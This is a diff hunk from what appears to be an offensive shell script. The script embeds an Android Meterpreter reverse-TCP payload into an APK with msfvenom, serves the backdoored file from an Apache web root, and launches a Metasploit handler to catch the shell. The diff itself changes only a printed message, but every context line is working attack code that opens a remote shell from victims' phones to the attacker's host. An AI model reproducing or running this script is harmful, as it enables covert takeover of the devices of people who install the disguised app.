@@ -64,7 +64,7 @@ msfvenom -x $capk -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport -
 sudo service apache2 start
 sudo cp $bapk /var/www/html/
 echo "Visit To : http://$lhost/$bapk"
-echo "Ready to Hack!"
+echo "YEAh BOI!"
 
 #Starting Msfconsole Handler
 msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit;"
